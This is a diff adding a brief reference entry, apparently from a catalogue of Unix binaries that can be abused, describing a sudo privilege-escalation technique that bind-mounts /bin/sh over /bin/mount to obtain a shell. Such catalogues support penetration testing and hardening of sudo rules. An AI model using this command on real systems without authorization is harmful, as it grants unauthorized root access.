@@ -1,0 +1,10 @@
+mount
+=====
+
+Privilege Escalation
+--------------------
+
+[Sudo]
+    mount -o bind /bin/sh /bin/mount
+mount
+    This overrides `mount` itself with a shell (or any other executable).
